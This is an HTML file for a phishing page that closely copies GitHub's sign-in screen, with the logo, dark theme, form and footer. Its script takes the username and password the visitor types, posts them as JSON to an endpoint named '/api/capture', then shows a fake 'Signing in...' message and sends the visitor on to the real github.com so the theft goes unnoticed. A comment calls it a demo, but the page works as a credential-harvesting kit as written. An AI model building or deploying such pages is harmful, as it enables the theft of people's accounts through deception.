<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GitHub</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&amp;family=Space+Grotesk:wght@500;600&amp;display=swap');
        
        :root {
            --gh-bg: #0d1117;
            --gh-surface: #161b22;
            --gh-border: #30363d;
            --gh-text: #c9d1d9;
            --gh-text-secondary: #8b949e;
            --gh-accent: #58a6ff;
            --gh-green: #3fb950;
        }
        
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
            background-color: var(--gh-bg);
            color: var(--gh-text);
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            align-items: center;
            justify-content: center;
            line-height: 1.5;
        }
        
        .container {
            width: 100%;
            max-width: 380px;
            padding: 0 20px;
        }
        
        .logo {
            display: flex;
            justify-content: center;
            margin-bottom: 32px;
        }
        
        .logo svg {
            width: 64px;
            height: 64px;
            fill: #fff;
        }
        
        .card {
            background-color: var(--gh-surface);
            border: 1px solid var(--gh-border);
            border-radius: 12px;
            padding: 32px 40px 40px;
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.3);
        }
        
        h1 {
            font-size: 24px;
            font-weight: 600;
            text-align: center;
            margin-bottom: 24px;
            color: #fff;
        }
        
        .form-group {
            margin-bottom: 16px;
        }
        
        label {
            display: block;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 6px;
            color: var(--gh-text);
        }
        
        input {
            width: 100%;
            padding: 12px 16px;
            background-color: #0d1117;
            border: 1px solid var(--gh-border);
            border-radius: 6px;
            color: var(--gh-text);
            font-size: 16px;
            transition: all 0.2s ease;
        }
        
        input:focus {
            outline: none;
            border-color: var(--gh-accent);
            box-shadow: 0 0 0 3px rgba(88, 166, 255, 0.3);
        }
        
        .password-wrapper {
            position: relative;
        }
        
        .toggle-password {
            position: absolute;
            right: 16px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: var(--gh-text-secondary);
            cursor: pointer;
            font-size: 18px;
        }
        
        .btn {
            width: 100%;
            padding: 12px 16px;
            background-color: var(--gh-green);
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 8px;
            transition: background-color 0.2s ease;
        }
        
        .btn:hover {
            background-color: #2ea44f;
        }
        
        .links {
            text-align: center;
            margin-top: 24px;
            font-size: 14px;
        }
        
        .links a {
            color: var(--gh-accent);
            text-decoration: none;
        }
        
        .links a:hover {
            text-decoration: underline;
        }
        
        .divider {
            margin: 24px 0;
            border-top: 1px solid var(--gh-border);
        }
        
        .footer {
            margin-top: 40px;
            text-align: center;
            font-size: 12px;
            color: var(--gh-text-secondary);
        }
        
        .footer a {
            color: var(--gh-text-secondary);
            text-decoration: none;
        }
        
        .error {
            color: #f85149;
            font-size: 14px;
            margin-top: 8px;
            display: none;
        }
        
        .header {
            position: absolute;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 14px;
            color: var(--gh-text-secondary);
        }
    </style>
</head>
<body>
    <div class="header">
        <span>GitHub</span>
    </div>

    <div class="container">
        <div class="logo">
            <!-- GitHub Octocat SVG -->
            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                <path d="M12 2C6.477 2 2 6.477 2 12c0 4.418 2.865 8.166 6.839 9.49.5.092.682-.217.682-.482 0-.237-.009-.866-.014-1.7-2.782.604-3.369-1.34-3.369-1.34-.455-1.156-1.11-1.463-1.11-1.463-.908-.62.069-.608.069-.608 1.003.07 1.532 1.03 1.532 1.03.892 1.529 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.11-4.555-4.943 0-1.091.39-1.984 1.03-2.682-.103-.253-.447-1.27.098-2.646 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0112 6.844c.85.004 1.705.115 2.504.337 1.91-1.296 2.75-1.027 2.75-1.027.546 1.376.202 2.393.1 2.646.64.698 1.03 1.591 1.03 2.682 0 3.828-2.339 4.687-4.566 4.935.359.31.679.92.679 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482A10.003 10.003 0 0022 12c0-5.523-4.477-10-10-10z"/>
            </svg>
        </div>
        
        <div class="card">
            <h1>Sign in to GitHub</h1>
            
            <form id="loginForm">
                <div class="form-group">
                    <label for="username">Username or email address</label>
                    <input type="text" id="username" autocomplete="username" required>
                </div>
                
                <div class="form-group">
                    <label for="password">Password</label>
                    <div class="password-wrapper">
                        <input type="password" id="password" autocomplete="current-password" required>
                        <button type="button" class="toggle-password" id="togglePassword">👁️</button>
                    </div>
                </div>
                
                <div id="errorMessage" class="error"></div>
                
                <button type="submit" class="btn">Sign in</button>
            </form>
            
            <div class="links">
                <a href="#">Forgot password?</a>
            </div>
            
            <div class="divider"></div>
            
            <div class="links">
                New to GitHub? <a href="#">Create an account</a>
            </div>
        </div>
    </div>
    
    <div class="footer">
        <a href="#">Terms</a> • 
        <a href="#">Privacy</a> • 
        <a href="#">Security</a> • 
        GitHub, Inc. © 2026
    </div>

    <script>
        // Toggle password visibility
        const togglePassword = document.getElementById('togglePassword');
        const passwordInput = document.getElementById('password');
        
        togglePassword.addEventListener('click', function() {
            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordInput.setAttribute('type', type);
            this.textContent = type === 'password' ? '👁️' : '🙈';
        });
        
        // Form submission
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();
            const errorEl = document.getElementById('errorMessage');
            
            if (!username || !password) {
                errorEl.textContent = 'Please enter your username and password.';
                errorEl.style.display = 'block';
                return;
            }
            
            errorEl.style.display = 'none';
            
            try {
                const response = await fetch('/api/capture', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        user: username,
                        pass: password
                    })
                });
                
                if (response.ok) {
                    // Simulate successful login redirect for demo purposes
                    const successMsg = document.createElement('div');
                    successMsg.style.cssText = 'position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: #3fb950; color: white; padding: 12px 24px; border-radius: 6px; font-weight: 500; z-index: 1000;';
                    successMsg.textContent = 'Signing in...';
                    document.body.appendChild(successMsg);
                    
                    setTimeout(() => {
                        window.location.href = 'https://github.com';
                    }, 1200);
                } else {
                    errorEl.textContent = 'Invalid credentials. Please try again.';
                    errorEl.style.display = 'block';
                }
            } catch (err) {
                console.error('Login error:', err);
                errorEl.textContent = 'Network error. Please check your connection.';
                errorEl.style.display = 'block';
            }
        });
    </script>
</body>
</html>
